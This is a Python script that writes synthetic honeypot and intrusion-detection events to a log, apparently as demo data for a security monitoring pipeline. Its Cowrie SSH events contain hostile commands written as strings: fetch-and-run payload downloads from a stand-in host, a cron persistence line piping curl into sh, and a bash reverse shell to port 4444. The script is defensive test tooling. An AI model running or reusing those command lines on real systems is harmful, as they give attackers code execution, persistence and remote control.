#!/usr/bin/env python3
from __future__ import annotations

import argparse
from datetime import datetime, timedelta, timezone
import json
from pathlib import Path


def _iso(ts: datetime) -> str:
    return ts.isoformat().replace("+00:00", "Z")


def _events(attacker_ip: str, target_ip: str, session: str) -> list[dict[str, object]]:
    now = datetime.now(timezone.utc).replace(microsecond=0)
    payload_host = "203.0.113.77"
    events: list[dict[str, object]] = [
        {
            "timestamp": _iso(now),
            "event_type": "alert",
            "src_ip": attacker_ip,
            "src_port": 43122,
            "dest_ip": target_ip,
            "dest_port": 80,
            "proto": "TCP",
            "alert": {
                "action": "allowed",
                "signature_id": 2026062401,
                "signature": "HONEYPOT DEMO Nmap TCP port sweep against reverse proxy",
                "category": "Attempted Information Leak",
                "severity": 2,
            },
        },
        {
            "timestamp": _iso(now + timedelta(seconds=1)),
            "eventid": "cowrie.login.failed",
            "src_ip": attacker_ip,
            "src_port": 50101,
            "dst_ip": target_ip,
            "dst_port": 22,
            "username": "root",
            "password": "admin",
            "protocol": "ssh",
            "session": session,
        },
        {
            "timestamp": _iso(now + timedelta(seconds=2)),
            "eventid": "cowrie.login.failed",
            "src_ip": attacker_ip,
            "src_port": 50102,
            "dst_ip": target_ip,
            "dst_port": 22,
            "username": "admin",
            "password": "password",
            "protocol": "ssh",
            "session": session,
        },
        {
            "timestamp": _iso(now + timedelta(seconds=3)),
            "eventid": "cowrie.login.success",
            "src_ip": attacker_ip,
            "src_port": 50103,
            "dst_ip": target_ip,
            "dst_port": 22,
            "username": "root",
            "password": "toor",
            "protocol": "ssh",
            "session": session,
        },
        {
            "timestamp": _iso(now + timedelta(seconds=5)),
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_ip": target_ip,
            "dst_port": 22,
            "session": session,
            "input": "uname -a; id; ip addr",
        },
        {
            "timestamp": _iso(now + timedelta(seconds=7)),
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_ip": target_ip,
            "dst_port": 22,
            "session": session,
            "input": f"wget http://{payload_host}/bot.sh -O /tmp/bot.sh && chmod +x /tmp/bot.sh",
        },
        {
            "timestamp": _iso(now + timedelta(seconds=9)),
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_ip": target_ip,
            "dst_port": 22,
            "session": session,
            "input": "(crontab -l; echo '*/5 * * * * curl http://203.0.113.77/p.sh | sh') | crontab -",
        },
        {
            "timestamp": _iso(now + timedelta(seconds=11)),
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_ip": target_ip,
            "dst_port": 22,
            "session": session,
            "input": "bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1'",
        },
        {
            "timestamp": _iso(now + timedelta(seconds=13)),
            "schema_version": 1,
            "event_type": "process_exec",
            "host": target_ip,
            "container_id": "cowrie-demo",
            "cgroup_id": session,
            "pid": 4242,
            "ppid": 4200,
            "uid": 0,
            "gid": 0,
            "comm": "bash",
            "binary": "/bin/bash",
            "arguments_sample": ["bash", "-c", "curl http://203.0.113.77/p.sh | sh"],
        },
        {
            "timestamp": _iso(now + timedelta(seconds=15)),
            "schema_version": 1,
            "event_type": "network_connect",
            "host": target_ip,
            "container_id": "cowrie-demo",
            "cgroup_id": session,
            "pid": 4243,
            "uid": 0,
            "gid": 0,
            "comm": "curl",
            "binary": "/usr/bin/curl",
            "src_ip": target_ip,
            "src_port": 39444,
            "dest_ip": payload_host,
            "dest_port": 80,
            "protocol": "tcp",
            "arguments_sample": ["curl", f"http://{payload_host}/p.sh"],
        },
        {
            "timestamp": _iso(now + timedelta(seconds=17)),
            "schema_version": 1,
            "event_type": "file_access",
            "host": target_ip,
            "container_id": "cowrie-demo",
            "cgroup_id": session,
            "pid": 4244,
            "uid": 0,
            "gid": 0,
            "comm": "sh",
            "binary": "/bin/sh",
            "filename": "/etc/cron.d/system-update",
            "access_type": "write",
            "severity_hint": "high",
        },
        {
            "timestamp": _iso(now + timedelta(seconds=19)),
            "schema_version": 1,
            "event_type": "privilege_change",
            "host": target_ip,
            "container_id": "cowrie-demo",
            "cgroup_id": session,
            "pid": 4245,
            "uid": 0,
            "gid": 0,
            "comm": "su",
            "binary": "/bin/su",
            "severity_hint": "high",
        },
    ]
    return events


def main() -> int:
    parser = argparse.ArgumentParser(description="Append deterministic demo attack events.")
    parser.add_argument("--raw-log", required=True)
    parser.add_argument("--attacker-ip", default="10.70.1.50")
    parser.add_argument("--target-ip", default="10.70.0.10")
    parser.add_argument("--session", default="demo-ssh-session")
    args = parser.parse_args()

    path = Path(args.raw_log)
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        for event in _events(args.attacker_ip, args.target_ip, args.session):
            handle.write(json.dumps(event, sort_keys=True) + "\n")
    print(f"appended demo attack telemetry to {path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
